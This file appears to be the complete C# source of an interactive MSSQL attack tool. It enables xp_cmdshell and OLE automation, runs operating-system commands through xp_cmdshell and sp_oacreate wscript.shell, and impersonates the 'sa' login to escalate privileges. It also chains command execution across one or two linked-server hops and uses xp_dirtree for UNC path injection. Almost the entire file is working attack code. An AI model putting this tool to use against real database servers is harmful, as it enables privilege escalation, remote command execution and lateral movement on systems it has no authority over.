using System;
using System.Data.SqlClient;
using System.Collections.Generic;

namespace SQLConnection
{
    class Program
    {
        static int getServerRole(String mappedDBUser, SqlConnection con, String srvRole)
        {
            SqlCommand cmd = new SqlCommand($"SELECT IS_SRVROLEMEMBER('{srvRole}');", con);
            SqlDataReader reader = cmd.ExecuteReader();
            reader.Read();
            int srvRespon = (int)reader[0];
            reader.Close();
            if (srvRespon == 0)
            {
                return 0;
            }
            else if (srvRespon == 1)
            {
                return 1;
            }

            return 0;

        }

        static void CommandExecute(string command, string[] parts, SqlConnection con, ref String mappedDBUser)
        {
            SqlCommand cmd;
            String payload;
            SqlDataReader reader;
            int sa = getServerRole(mappedDBUser, con, "sysadmin");
            if (command == "xp_enable" || command == "xp_disable")
            {
                bool enable = (command == "xp_enable");
                string val = enable ? "1" : "0";
                string label = enable ? "enabled" : "disabled";

                if (parts.Length == 1)
                {
                    // Local
                    if (sa != 1) { Console.WriteLine($"[-] Permission denied."); return; }
                    payload = $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', {val}; RECONFIGURE;";
                    cmd = new SqlCommand(payload, con);
                    cmd.ExecuteNonQuery();
                    Console.WriteLine($"[*] xp_cmdshell {label} locally.");
                }
                else if (parts.Length == 2)
                {
                    // Single hop
                    string hop1 = parts[1].StartsWith("[") ? parts[1] : $"[{parts[1]}]";
                    payload = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', {val}; RECONFIGURE;') AT {hop1}";
                    cmd = new SqlCommand(payload, con);
                    cmd.ExecuteNonQuery();
                    Console.WriteLine($"[*] xp_cmdshell {label} on {hop1}.");
                }
                else if (parts.Length == 3)
                {
                    // Double hop
                    string hop1 = parts[1].StartsWith("[") ? parts[1] : $"[{parts[1]}]";
                    string hop2 = parts[2].StartsWith("[") ? parts[2] : $"[{parts[2]}]";
                    payload = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE; EXEC sp_configure ''''xp_cmdshell'''', {val}; RECONFIGURE;'') AT {hop2}') AT {hop1}";
                    cmd = new SqlCommand(payload, con);
                    cmd.ExecuteNonQuery();
                    Console.WriteLine($"[*] xp_cmdshell {label} on {hop1} -> {hop2}.");
                }
                return;
            }

            else if (sa == 1 && command == "sp_enable")
            {

                payload = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                cmd = new SqlCommand(payload, con);
                cmd.ExecuteNonQuery();
                Console.WriteLine("[*] sp_oacreate has been successfully enabled.\n");
                return;
            }
            else if (sa == 1 && command == "sp_disable")
            {
                payload = "EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;";
                cmd = new SqlCommand(payload, con);
                cmd.ExecuteNonQuery();
                Console.WriteLine("[*] sp_oacreate has been successfully disabled.");
                return;
            }
            else if (sa==0 && (command == "xp_enable" || command == "xp_disable" || command == "sp_enable" || command == "sp_disable"))
            {
                Console.WriteLine($"[-] Permission denied: The login {mappedDBUser} does not have EXECUTE permission.");
                return;
            }
            else if (command == "help" || command == "?")
            {
                Console.WriteLine("    sp_cmdlinked2 - sp_cmdlinked2 [hop1_server] [hop2_server] <command>\n    sp_cmdlinked - command execution on linked server (sp_cmdlinked sqlServer command)\n    sp_disablelinked - disable xp_cmdshell on remote sql server (sp_disablelinked serverName)\n    sp_enablelinked - enable xp_cmdshell on remote sql server (sp_enablelinked serverName)\n    sp_linkedservers - show linked servers.\n    xp_cmdshell - Executes cmdshell commands.\n    sp_oacreate - Executes commands using wscript shell.\n    xp_dirtree - Dir listing (can be used for UNC Path Injection)\n    xp_enable - Enables xp_cmdshell (Need privs) + (optional - xp_enable [hopserver1] [hopserver2])\n    xp_disable - Disabled xp_cmdshell (Need privs) + (optional - xp_disable [hopserver1] [hopserver2])\n    sp_enable - Enables sp_oacreate (Need privs)\n    sp_disable - Disabled sp_oacreate (Need privs)\n    impersonators - Show logins that can be impersonated as\n    customquery - Execute a custom query\n    elevate - Will try to impersonate as the sa\n    help - This message\n    exit - close connection\n");
                return;
            }
            else if (command == "impersonators")
            {
                payload = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                cmd = new SqlCommand(payload, con);
                reader = cmd.ExecuteReader();
                while (reader.Read() == true)
                {
                    Console.WriteLine($"[*] Logins that can be impersonated: {reader[0]}");
                }
                reader.Close();
                return;
            }
            else if (command == "elevate")
            {
                try
                {
                    payload = "EXECUTE AS LOGIN = 'sa';";
                    cmd = new SqlCommand(payload, con);
                    cmd.ExecuteNonQuery();
                    payload = "SELECT SYSTEM_USER;";
                    cmd = new SqlCommand(payload, con);
                    reader = cmd.ExecuteReader();
                    reader.Read();
                    if (reader[0].ToString() == "sa")
                    {
                        Console.WriteLine("[+] Successfully impersonated as sa!\n");
                        mappedDBUser = "sa";
                        reader.Close();
                        return;
                    }
                }
                catch (SqlException ex)
                {
                    Console.WriteLine($"[-] Impersonation failed. Reason: {ex.Message}");
                    return;
                }
            }
            else if (command == "sp_linkedservers")
            {
                List<string> servers = new List<string>();
                using (cmd = new SqlCommand("EXEC sp_linkedservers;", con))
                using (reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        if (reader[0] != DBNull.Value) servers.Add(reader[0].ToString());
                    }
                }

                foreach (string srv in servers)
                {
                    payload = $"SELECT suser FROM OPENQUERY([{srv.Replace("]", "]]")}], 'SELECT SYSTEM_USER as suser')";
                    try
                    {
                        using (SqlCommand cmd2 = new SqlCommand(payload, con))
                        using (SqlDataReader reader2 = cmd2.ExecuteReader())
                        {
                            if (reader2.Read())
                                Console.WriteLine($"[+] Acting as {reader2[0]} at linked MSSQL server: {srv}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Could not query {srv}: {ex.Message}");
                        continue;
                    }

                    payload = $"SELECT srvname FROM OPENQUERY([{srv.Replace("]", "]]")}], 'SELECT srvname FROM master..sysservers')";
                    try
                    {
                        List<string> remoteServers = new List<string>();
                        using (SqlCommand cmd3 = new SqlCommand(payload, con))
                        using (SqlDataReader reader3 = cmd3.ExecuteReader())
                        {
                            while (reader3.Read())
                            {
                                if (reader3[0] != DBNull.Value)
                                    remoteServers.Add(reader3[0].ToString());
                            }
                        }

                        foreach (string remoteSrv in remoteServers)
                        {
                            string innerQuery = $"SELECT suser FROM OPENQUERY([{remoteSrv.Replace("]", "]]")}], ''SELECT SYSTEM_USER as suser'')";
                            payload = $"SELECT * FROM OPENQUERY([{srv.Replace("]", "]]")}], '{innerQuery}')";
                            try
                            {
                                using (SqlCommand cmd4 = new SqlCommand(payload, con))
                                using (SqlDataReader reader4 = cmd4.ExecuteReader())
                                {
                                    if (reader4.Read())
                                        Console.WriteLine($"    └── Acting as {reader4[0]} at {srv} -> {remoteSrv}");
                                }
                            }
                            catch
                            {
                                Console.WriteLine($"    └── Found link: {srv} -> {remoteSrv} (could not query identity)");
                            }
                        }
                    }
                    catch
                    {
                    }
                }
                return;
            }


            if (parts.Length < 2)
            {
                Console.WriteLine("[*] Missing argument. Usage: <command> <value>");
                return;
            }

            if (command == "customquery")
            {
                string path = string.Join(" ", parts, 1, parts.Length - 1);
                path = path.Replace("\"", "");
                payload = $"{path}";
                try
                {
                    cmd = new SqlCommand(payload, con);
                    reader = cmd.ExecuteReader();
                    while (reader.Read())
                    {
                        if (reader[0] != DBNull.Value)
                        {
                            Console.WriteLine(reader[0].ToString());
                        }
                    }
                    reader.Close();
                    return;
                }
                catch (SqlException ex)
                {
                    if (ex.Number == 229)
                    {
                        Console.WriteLine($"[-] Permission denied: The login {mappedDBUser} does not have the permission.");
                        return;
                    }
                    else
                    {
                        Console.WriteLine($"[-] SQL Error {ex.Number}: {ex.Message}");
                        return;
                    }
                }
            }

            if (command == "xp_dirtree" || command == "dir" || command == "dirtree")
            {
                string path = string.Join(" ", parts, 1, parts.Length - 1);
                path = path.Replace("\"", "");
                payload = $"EXEC master..xp_dirtree '{path}',1,1;";
                try
                {
                    cmd = new SqlCommand(payload, con);
                    reader = cmd.ExecuteReader();
                    while (reader.Read())
                    {
                        if (reader[0] != DBNull.Value)
                        {
                            Console.WriteLine(reader[0].ToString());
                        }
                    }
                    reader.Close();
                    return;
                }
                catch (SqlException ex)
                {
                    if (ex.Number == 229)
                    {
                        Console.WriteLine($"[-] Permission denied: The login {mappedDBUser} does not have permission.");
                        return;
                    }
                    else
                    {
                        Console.WriteLine($"[-] SQL Error {ex.Number}: {ex.Message}");
                        return;
                    }
                }

            }
            else if (command == "sp_enablelinked")
            {
                if (parts.Length < 2)
                {
                    Console.WriteLine("[-] Usage: sp_enablelinked <linked_server_name>");
                    return;
                }

                string hostname = string.Join(" ", parts, 1, parts.Length - 1).Replace("\"", "");
                payload = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {hostname}";
                try
                {
                    using (cmd = new SqlCommand(payload, con))
                    {
                        cmd.ExecuteNonQuery();
                        Console.WriteLine($"[*] xp_cmdshell has been successfully enabled on {hostname}.");
                    }
                }
                catch (SqlException ex)
                {
                    Console.WriteLine($"[-] Failed to enable xp_cmdshell on {hostname}. Error: {ex.Message}");
                }
                return;
            }
            else if (command == "sp_disablelinked")
            {
                if (parts.Length < 2)
                {
                    Console.WriteLine("[-] Usage: sp_disablelinked <linked_server_name>");
                    return;
                }
                string hostname = string.Join(" ", parts, 1, parts.Length - 1).Replace("\"", "");
                payload = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 0; RECONFIGURE;') AT {hostname}";

                try
                {
                    using (cmd = new SqlCommand(payload, con))
                    {
                        cmd.ExecuteNonQuery();
                        Console.WriteLine($"[*] xp_cmdshell has been successfully disabled on {hostname}.");
                    }
                }
                catch (SqlException ex)
                {
                    Console.WriteLine($"[-] Failed to disable xp_cmdshell on {hostname}. Error: {ex.Message}");
                }
                return;
            }
            else if (command == "sp_cmdlinked")
            {
                string hostname = parts[1];
                string path = string.Join(" ", parts, 2, parts.Length - 2);
                path = path.Replace("\"", "");
                payload = $"EXEC ('master..xp_cmdshell ''{path}'';') AT {hostname};";
                try
                {
                    cmd = new SqlCommand(payload, con);
                    reader = cmd.ExecuteReader();
                    while (reader.Read())
                    {
                        if (reader[0] != DBNull.Value)
                        {
                            Console.WriteLine(reader[0].ToString());
                        }
                    }
                    reader.Close();
                    return;
                }
                catch (SqlException ex)
                {
                    if (ex.Number == 229)
                    {
                        Console.WriteLine($"[-] Permission denied: The login {mappedDBUser} does not have permission.");
                        return;
                    }
                    else
                    {
                        Console.WriteLine($"[-] SQL Error {ex.Number}: {ex.Message}");
                        return;
                    }
                }
            }
            else if (command == "xp_cmdshell" || command == "cmdshell" || command == "run")
            {
                string path = string.Join(" ", parts, 1, parts.Length - 1);
                path = path.Replace("\"", "");
                payload = $"EXEC master..xp_cmdshell '{path}'; ";
                try
                {
                    cmd = new SqlCommand(payload, con);
                    reader = cmd.ExecuteReader();
                    while (reader.Read())
                    {
                        if (reader[0] != DBNull.Value)
                        {
                            Console.WriteLine(reader[0].ToString());
                        }
                    }
                    reader.Close();
                    return;
                }
                catch (SqlException ex)
                {
                    if (ex.Number == 229)
                    {
                        Console.WriteLine($"[-] Permission denied: The login {mappedDBUser} does not have permission.");
                        return;
                    }
                    else
                    {
                        Console.WriteLine($"[-] SQL Error {ex.Number}: {ex.Message}");
                        return;
                    }
                }
            }
            else if (command == "sp_oacreate")
            {
                string path = string.Join(" ", parts, 1, parts.Length - 1);
                path = path.Replace("\"", "");
                payload = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{path}\"';";
                try
                {
                    cmd = new SqlCommand(payload, con);
                    reader = cmd.ExecuteReader();
                    while (reader.Read())
                    {
                        if (reader[0] != DBNull.Value)
                        {
                            Console.WriteLine($"[+] Successfully executed {path}\n");
                        }
                    }
                    reader.Close();
                    return;
                }
                catch (SqlException ex)
                {
                    if (ex.Number == 229)
                    {
                        Console.WriteLine($"[-] Permission denied: The login {mappedDBUser} does not have permission.");
                        return;
                    }
                    else
                    {
                        Console.WriteLine($"[-] SQL Error {ex.Number}: {ex.Message}");
                        return;
                    }
                }
            }
            else if (command == "sp_cmdlinked2")
            {
                if (parts.Length < 4)
                {
                    Console.WriteLine("[-] Usage: sp_cmdlinked2 <hop1_server> <hop2_server> <command>");
                    return;
                }
                string hop1 = parts[1].StartsWith("[") ? parts[1] : $"[{parts[1]}]";
                string hop2 = parts[2].StartsWith("[") ? parts[2] : $"[{parts[2]}]";
                string path = string.Join(" ", parts, 3, parts.Length - 3).Replace("\"", "");
                payload = $"EXEC ('EXEC (''master..xp_cmdshell ''''{path}'''''') AT {hop2}') AT {hop1};";
                try
                {
                    cmd = new SqlCommand(payload, con);
                    reader = cmd.ExecuteReader();
                    while (reader.Read())
                    {
                        if (reader[0] != DBNull.Value)
                            Console.WriteLine(reader[0].ToString());
                    }
                    reader.Close();
                    return;
                }
                catch (SqlException ex)
                {
                    Console.WriteLine($"[-] SQL Error {ex.Number}: {ex.Message}");
                    return;
                }
            }


            return;
        }
        static void Main(string[] args)
        {
            if (args.Length == 0){
                Console.WriteLine("Help Arguments:\n-constring : connectionstring\n-username : Username\n-password : Password\n-database : Database name (default is master)\n-sqlserver : MSSQL Server to authenticate to\n-windows-auth : Uses kerberos authentication (Windows Authentication)\n");
            }
            string userName = null, password = null, server = null, db = "master", constring = null;
            bool isWindowsAuth = false;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLower())
                {
                    case "-username":
                        if (++i < args.Length) userName = args[i];
                        break;
                    case "-password":
                        if (++i < args.Length) password = args[i];
                        break;
                    case "-database":
                        if (++i < args.Length) db = args[i];
                        break;
                    case "-sqlserver":
                        if (++i < args.Length) server = args[i];
                        break;
                    case "-constring":
                        if (++i < args.Length) constring = args[i];
                        break;
                    case "-windows-auth":
                        isWindowsAuth = true;
                        break;  

                }
            }

            if (args.Length == 0)
            {
                return;
            }
            string conStr = null;

            if (!string.IsNullOrEmpty(constring))
            {
                conStr = constring;
            }
            else
            {
                conStr = isWindowsAuth
                ? $"Server={server};Database={db};Integrated Security=True;"
                : $"Server={server};Database={db};User Id={userName};Password={password};";
            }

            SqlConnection con = new SqlConnection(conStr);
            try
            {
                con.Open();
                Console.WriteLine($"[+] Successfully connected to:\n    Database: {con.Database}\n    Server: {con.DataSource}\n    MSSQL version: {con.ServerVersion}\n");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Failed connecting to database.\n Error: {e.Message}");
                Environment.Exit(0);
            }

            // Windows User
            SqlCommand sqlcom = new SqlCommand("SELECT SYSTEM_USER;", con);
            SqlDataReader reader = sqlcom.ExecuteReader();
            reader.Read();
            Console.WriteLine($"[+] Logged in as: {reader[0]}");
            reader.Close();

            //DB User
            sqlcom = new SqlCommand("SELECT USER_NAME();", con);
            reader = sqlcom.ExecuteReader();
            reader.Read();
            Console.WriteLine($"[+] Mapped as DB User: {reader[0]}");
            String mappedDBUser = (String)reader[0];
            reader.Close();


            // Entering interactive mode.
            Console.WriteLine($"\nEntering interactive mode as {mappedDBUser}.\n");
            String initUser = mappedDBUser;
            while (true)
            {
                sqlcom = new SqlCommand("SELECT SYSTEM_USER;", con);
                reader = sqlcom.ExecuteReader();
                reader.Read();
                mappedDBUser = (String)reader[0];
                reader.Close();
                Console.Write($"{mappedDBUser}: ");
                String cmd = Console.ReadLine();
                if (string.IsNullOrWhiteSpace(cmd))
                {
                    continue;
                }
                string[] parts = cmd.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                string command = parts[0].ToLower();
                if (parts.Length == 0) continue;
                if (command == "exit" || command == "quit")
                {
                    break;
                }
                CommandExecute(command, parts, con, ref mappedDBUser);
            }

            con.Close();
        }
    }
}
